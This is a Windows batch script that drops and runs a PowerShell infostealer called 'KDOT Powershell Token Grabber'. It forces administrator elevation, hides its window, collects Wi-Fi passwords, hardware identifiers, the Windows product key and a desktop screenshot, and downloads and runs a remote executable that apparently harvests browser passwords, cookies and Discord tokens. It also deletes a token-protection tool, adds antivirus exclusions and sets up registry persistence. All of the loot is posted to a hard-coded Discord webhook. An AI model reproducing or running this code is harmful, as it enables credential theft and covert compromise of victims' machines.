@echo off

net session >nul 2>&1
if %errorlevel% == 0 (
    goto :admin
) else (
    powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'"
    exit /b 0
)
:admin

echo function CHECK_IF_ADMIN { > powershell123.ps1
echo $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test >> powershell123.ps1
echo } >> powershell123.ps1
echo function EXFILTRATE-DATA { >> powershell123.ps1
echo $webhook = "https://discord.com/api/webhooks/1097447939854569522/uSMJWZcq582hY0kZLjWYsmRX__nfXVbFxdC09K_TrkphSR_k4YNTAbqon1HAvPA9zFS3" >> powershell123.ps1
echo $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing >> powershell123.ps1
echo $ip = $ip.Content >> powershell123.ps1
echo $ip ^> $env:LOCALAPPDATA\Temp\ip.txt >> powershell123.ps1
echo $lang = (Get-WinUserLanguageList).LocalizedName >> powershell123.ps1
echo $date = (get-date).toString("r") >> powershell123.ps1
echo Get-ComputerInfo ^> $env:LOCALAPPDATA\Temp\system_info.txt >> powershell123.ps1
echo $osversion = (Get-WmiObject -class Win32_OperatingSystem).Caption >> powershell123.ps1
echo $uuid = Get-WmiObject -Class Win32_ComputerSystemProduct ^| Select-Object -ExpandProperty UUID >> powershell123.ps1
echo $uuid ^> $env:LOCALAPPDATA\Temp\uuid.txt >> powershell123.ps1
echo $cpu = Get-WmiObject -Class Win32_Processor ^| Select-Object -ExpandProperty Name >> powershell123.ps1
echo $cpu ^> $env:LOCALAPPDATA\Temp\cpu.txt >> powershell123.ps1
echo $fulldiskinfo = diskdata  ^| out-string >> powershell123.ps1
echo $fulldiskinfo ^> $env:temp\DiskInfo.txt >> powershell123.ps1
echo $gpu = (Get-WmiObject Win32_VideoController).Name >> powershell123.ps1
echo $gpu ^> $env:LOCALAPPDATA\Temp\GPU.txt >> powershell123.ps1
echo $format = " GB" >> powershell123.ps1
echo $total = Get-CimInstance Win32_PhysicalMemory ^| Measure-Object -Property capacity -Sum ^| Foreach {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))} >> powershell123.ps1
echo $raminfo = "$total" + "$format" >> powershell123.ps1
echo $mac = Get-WmiObject win32_networkadapterconfiguration ^| select description, macaddress >> powershell123.ps1
echo $mac ^> $env:LOCALAPPDATA\Temp\mac.txt >> powershell123.ps1
echo $username = $env:USERNAME >> powershell123.ps1
echo $hostname = $env:COMPUTERNAME >> powershell123.ps1
echo $netstat = netstat -ano ^> $env:LOCALAPPDATA\Temp\netstat.txt >> powershell123.ps1
echo $wifipasslist = netsh wlan show profiles ^| Select-String "\:(.+)$" ^| %%{$name=$_.Matches.Groups[1].Value.Trim(); $_} ^| %%{(netsh wlan show profile name="$name" key=clear)}  ^| Select-String "Key Content\W+\:(.+)$" ^| %%{$pass=$_.Matches.Groups[1].Value.Trim(); $_} ^| %%{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} ^| out-string >> powershell123.ps1
echo $wifi = $wifipasslist ^| out-string >> powershell123.ps1
echo $wifi ^> $env:temp\WIFIPasswords.txt >> powershell123.ps1
echo Get-CimInstance Win32_StartupCommand ^| Select-Object Name, command, Location, User ^| Format-List ^> $env:temp\StartUpApps.txt >> powershell123.ps1
echo Get-WmiObject win32_service ^|? State -match "running" ^| select Name, DisplayName, PathName, User ^| sort Name ^| ft -wrap -autosize ^>  $env:LOCALAPPDATA\Temp\running-services.txt >> powershell123.ps1
echo Get-WmiObject win32_process ^| Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path ^| ft -wrap -autosize ^> $env:temp\running-applications.txt >> powershell123.ps1
echo Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* ^| Select-Object DisplayName, DisplayVersion, Publisher, InstallDate ^| Format-Table ^> $env:temp\Installed-Applications.txt >> powershell123.ps1
echo Get-NetAdapter ^| ft Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize ^> $env:temp\NetworkAdapters.txt >> powershell123.ps1
echo $ProductKey >> powershell123.ps1
echo Get-ProductKey ^> $env:localappdata\temp\ProductKey.txt >> powershell123.ps1
echo Add-Type -AssemblyName System.Windows.Forms,System.Drawing >> powershell123.ps1
echo $screens = [Windows.Forms.Screen]::AllScreens >> powershell123.ps1
echo $top    = ($screens.Bounds.Top    ^| Measure-Object -Minimum).Minimum >> powershell123.ps1
echo $left   = ($screens.Bounds.Left   ^| Measure-Object -Minimum).Minimum >> powershell123.ps1
echo $width  = ($screens.Bounds.Right  ^| Measure-Object -Maximum).Maximum >> powershell123.ps1
echo $height = ($screens.Bounds.Bottom ^| Measure-Object -Maximum).Maximum >> powershell123.ps1
echo $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height) >> powershell123.ps1
echo $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height) >> powershell123.ps1
echo $graphics = [Drawing.Graphics]::FromImage($bmp) >> powershell123.ps1
echo $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size) >> powershell123.ps1
echo $bmp.Save("$env:localappdata\temp\desktop-screenshot.png") >> powershell123.ps1
echo $graphics.Dispose() >> powershell123.ps1
echo $bmp.Dispose() >> powershell123.ps1
echo $embed_and_body = @{ >> powershell123.ps1
echo "username" = "KDOT" >> powershell123.ps1
echo "content" = "@everyone" >> powershell123.ps1
echo "title" = "KDOT" >> powershell123.ps1
echo "description" = "Powerful Token Grabber" >> powershell123.ps1
echo "color" = "16711680" >> powershell123.ps1
echo "avatar_url" = "https://i.postimg.cc/m2SSKrBt/Logo.gif" >> powershell123.ps1
echo "url" = "https://discord.gg/vk3rBhcj2y" >> powershell123.ps1
echo "embeds" = @( >> powershell123.ps1
echo @{ >> powershell123.ps1
echo "title" = "POWERSHELL GRABBER" >> powershell123.ps1
echo "url" = "https://github.com/KDot227/Powershell-Token-Grabber/tree/main" >> powershell123.ps1
echo "description" = "New victim info collected !" >> powershell123.ps1
echo "color" = "16711680" >> powershell123.ps1
echo "footer" = @{ >> powershell123.ps1
echo "text" = "Made by KDOT, GODFATHER and CHAINSKI" >> powershell123.ps1
echo } >> powershell123.ps1
echo "thumbnail" = @{ >> powershell123.ps1
echo "url" = "https://i.postimg.cc/m2SSKrBt/Logo.gif" >> powershell123.ps1
echo } >> powershell123.ps1
echo "fields" = @( >> powershell123.ps1
echo @{ >> powershell123.ps1
echo "name" = ":satellite: IP" >> powershell123.ps1
echo "value" = "``````$ip``````" >> powershell123.ps1
echo }, >> powershell123.ps1
echo @{ >> powershell123.ps1
echo "name" = ":bust_in_silhouette: User Information" >> powershell123.ps1
echo "value" = "``````Date: $date `nLanguage: $lang `nUsername: $username `nHostname: $hostname``````" >> powershell123.ps1
echo }, >> powershell123.ps1
echo @{ >> powershell123.ps1
echo "name" = ":computer: Hardware" >> powershell123.ps1
echo "value" = "``````OS: $osversion `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac``````" >> powershell123.ps1
echo }, >> powershell123.ps1
echo @{ >> powershell123.ps1
echo "name" = ":floppy_disk: Disk" >> powershell123.ps1
echo "value" = "``````$fulldiskinfo``````" >> powershell123.ps1
echo } >> powershell123.ps1
echo @{ >> powershell123.ps1
echo "name" = ":signal_strength: WiFi" >> powershell123.ps1
echo "value" = "``````$wifi``````" >> powershell123.ps1
echo } >> powershell123.ps1
echo ) >> powershell123.ps1
echo } >> powershell123.ps1
echo ) >> powershell123.ps1
echo } >> powershell123.ps1
echo $payload = $embed_and_body ^| ConvertTo-Json -Depth 10 >> powershell123.ps1
echo Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing ^| Out-Null >> powershell123.ps1
echo Set-Location $env:LOCALAPPDATA\Temp >> powershell123.ps1
echo $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" >> powershell123.ps1
echo if ($token_prot -eq $true) { >> powershell123.ps1
echo Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force >> powershell123.ps1
echo } >> powershell123.ps1
echo $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat" >> powershell123.ps1
echo if ($secure_dat -eq $true) { >> powershell123.ps1
echo Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force >> powershell123.ps1
echo } >> powershell123.ps1
echo $TEMP_KOT = Test-Path "$env:LOCALAPPDATA\Temp\KDOT" >> powershell123.ps1
echo if ($TEMP_KOT -eq $false) { >> powershell123.ps1
echo New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory >> powershell123.ps1
echo } >> powershell123.ps1
echo $ProgressPreference = "SilentlyContinue";Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/main.exe" -OutFile "main.exe" -UseBasicParsing >> powershell123.ps1
echo $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru >> powershell123.ps1
echo $proc.WaitForExit() >> powershell123.ps1
echo $extracted = "$env:LOCALAPPDATA\Temp" >> powershell123.ps1
echo Move-Item -Path "$extracted\ip.txt" -Destination "$extracted\KDOT\ip.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\netstat.txt" -Destination "$extracted\KDOT\netstat.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\system_info.txt" -Destination "$extracted\KDOT\system_info.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\uuid.txt" -Destination "$extracted\KDOT\uuid.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\mac.txt" -Destination "$extracted\KDOT\mac.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\browser-cookies.txt" -Destination "$extracted\KDOT\browser-cookies.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\browser-history.txt" -Destination "$extracted\KDOT\browser-history.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\browser-passwords.txt" -Destination "$extracted\KDOT\browser-passwords.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\desktop-screenshot.png" -Destination "$extracted\KDOT\desktop-screenshot.png" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\tokens.txt" -Destination "$extracted\KDOT\tokens.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\WIFIPasswords.txt" -Destination "$extracted\KDOT\WIFIPasswords.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\GPU.txt" -Destination "$extracted\KDOT\GPU.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\Installed-Applications.txt" -Destination "$extracted\KDOT\Installed-Applications.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\DiskInfo.txt" -Destination "$extracted\KDOT\DiskInfo.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\CPU.txt" -Destination "$extracted\KDOT\CPU.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\NetworkAdapters.txt" -Destination "$extracted\KDOT\NetworkAdapters.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\ProductKey.txt" -Destination "$extracted\KDOT\ProductKey.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\StartUpApps.txt" -Destination "$extracted\KDOT\StartUpApps.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\KDOT\running-services.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\KDOT\running-applications.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\KDOT.zip" -Force >> powershell123.ps1
echo curl.exe -X POST -F 'payload_json={\"username\": \"POWERSHELL GRABBER\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/m2SSKrBt/Logo.gif\"}' -F "file=@$extracted\KDOT.zip" $webhook >> powershell123.ps1
echo Remove-Item "$extracted\KDOT.zip" >> powershell123.ps1
echo Remove-Item "$extracted\KDOT" -Recurse >> powershell123.ps1
echo Remove-Item "$extracted\main.exe" >> powershell123.ps1
echo } >> powershell123.ps1
echo function TASKS { >> powershell123.ps1
echo $test_KDOT = Test-Path -Path "$env:APPDATA\KDOT" >> powershell123.ps1
echo if ($test_KDOT -eq $false) { >> powershell123.ps1
echo try { >> powershell123.ps1
echo Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" >> powershell123.ps1
echo Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT" >> powershell123.ps1
echo } catch { >> powershell123.ps1
echo Write-Host "Failed to add exclusions" >> powershell123.ps1
echo } >> powershell123.ps1
echo New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" >> powershell123.ps1
echo $origin = $PSCommandPath >> powershell123.ps1
echo Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" >> powershell123.ps1
echo } >> powershell123.ps1
echo $scriptPath = "$env:APPDATA\KDOT\KDOT.ps1" >> powershell123.ps1
echo $command = "powershell.exe -NonInteractive -NoProfile -Nologo -ExecutionPolicy Bypass -WindowStyle hidden -File `"$scriptPath`"" >> powershell123.ps1
echo $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" >> powershell123.ps1
echo New-ItemProperty -Path $regPath -Name "KDOT" -Value $command -PropertyType String -Force ^| Out-Null >> powershell123.ps1
echo EXFILTRATE-DATA >> powershell123.ps1
echo } >> powershell123.ps1
echo function diskdata { >> powershell123.ps1
echo $disks = get-wmiobject Win32_LogicalDisk -computername "$env:computername" -Filter "DriveType = 3" >> powershell123.ps1
echo foreach ($disk in $disks) { >> powershell123.ps1
echo $letter = $disk.deviceID >> powershell123.ps1
echo $volumename = $disk.volumename >> powershell123.ps1
echo $totalspace = [math]::round($disk.size / 1GB, 2) >> powershell123.ps1
echo $freespace = [math]::round($disk.freespace / 1GB, 2) >> powershell123.ps1
echo $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2) >> powershell123.ps1
echo $disk ^| Select-Object @{n = "Letter"; e = { $letter } }, @{n = "Volume Name"; e = { $volumename } }, @{n = "Total (GB)"; e = { ($totalspace).tostring()}}, @{n = "Free (GB)"; e = { ($freespace).tostring()}}, @{n = "Used (GB)"; e = { ($usedspace).tostring()}} ^| FT >> powershell123.ps1
echo } >> powershell123.ps1
echo } >> powershell123.ps1
echo function Get-ProductKey { >> powershell123.ps1
echo $map="BCDFGHJKMPQRTVWXY2346789" >> powershell123.ps1
echo $value = (get-itemproperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").digitalproductid[0x34..0x42] >> powershell123.ps1
echo $ProductKey = "" >> powershell123.ps1
echo for ($i = 24; $i -ge 0; $i--) { >> powershell123.ps1
echo $r = 0 >> powershell123.ps1
echo for ($j = 14; $j -ge 0; $j--) { >> powershell123.ps1
echo $r = ($r * 256) -bxor $value[$j] >> powershell123.ps1
echo $value[$j] = [math]::Floor([double]($r / 24)) >> powershell123.ps1
echo $r = $r %% 24 >> powershell123.ps1
echo } >> powershell123.ps1
echo $ProductKey = $map[$r] + $ProductKey >> powershell123.ps1
echo if (($i %% 5) -eq 0 -and $i -ne 0) { >> powershell123.ps1
echo $ProductKey = "-" + $ProductKey >> powershell123.ps1
echo } >> powershell123.ps1
echo } >> powershell123.ps1
echo } >> powershell123.ps1
echo function Request-Admin { >> powershell123.ps1
echo while(!(CHECK_IF_ADMIN)) { >> powershell123.ps1
echo try { >> powershell123.ps1
echo Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -File `"$PSCommandPath`"" -Verb RunAs >> powershell123.ps1
echo exit >> powershell123.ps1
echo } >> powershell123.ps1
echo catch {} >> powershell123.ps1
echo } >> powershell123.ps1
echo } >> powershell123.ps1
echo function Hide-Console >> powershell123.ps1
echo { >> powershell123.ps1
echo if (-not ("Console.Window" -as [type])) { >> powershell123.ps1
echo Add-Type -Name Window -Namespace Console -MemberDefinition ' >> powershell123.ps1
echo [DllImport("Kernel32.dll")] >> powershell123.ps1
echo public static extern IntPtr GetConsoleWindow(); >> powershell123.ps1
echo [DllImport("user32.dll")] >> powershell123.ps1
echo public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow); >> powershell123.ps1
echo ' >> powershell123.ps1
echo } >> powershell123.ps1
echo $consolePtr = [Console.Window]::GetConsoleWindow() >> powershell123.ps1
echo $null = [Console.Window]::ShowWindow($consolePtr, 0) >> powershell123.ps1
echo } >> powershell123.ps1
echo if (CHECK_IF_ADMIN -eq $true) { >> powershell123.ps1
echo Hide-Console >> powershell123.ps1
echo TASKS >> powershell123.ps1
echo } else { >> powershell123.ps1
echo Write-Host ("Please run as admin!") -ForegroundColor Red >> powershell123.ps1
echo Request-Admin >> powershell123.ps1
echo } >> powershell123.ps1
powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
powershell.exe -noprofile -executionpolicy bypass -WindowStyle hidden -file powershell123.ps1
del powershell123.ps1 /f /q
timeout 3 > nul
exit
